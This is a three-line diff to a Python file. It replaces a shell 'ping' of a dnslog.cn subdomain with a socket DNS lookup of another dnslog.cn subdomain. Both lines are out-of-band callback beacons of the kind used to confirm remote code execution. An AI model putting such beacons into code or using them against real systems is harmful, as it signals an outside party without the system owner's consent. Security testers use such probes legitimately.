@@ -1,3 +1,3 @@
-import os
+import socket
 
-os.system("ping bz9ose.dnslog.cn")
+socket.gethostbyname('ocsra1.dnslog.cn')
